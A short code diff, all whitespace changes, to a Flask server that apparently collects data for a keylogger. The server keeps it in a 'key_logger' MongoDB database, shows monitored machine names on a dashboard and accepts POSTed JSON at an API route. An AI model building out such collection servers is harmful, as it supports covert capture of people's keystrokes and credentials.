@@ -20,14 +20,18 @@ db = client["key_logger"]
 db_collection = db["KeyLogger"]
 encryptor = Encryptor()
 
+
 @app.route("/")
 def home():
     computers = list(db_collection.find({}, {'_id': 0, "machine_name": 1}))
     return render_template("dashboard.html", computers=computers)
 
+
+
+
+
 @app.route("/api/computers", methods=["GET", "POST"])
 def get_computers():
-
     if request.method == "POST":
         new_data = request.get_json()
 
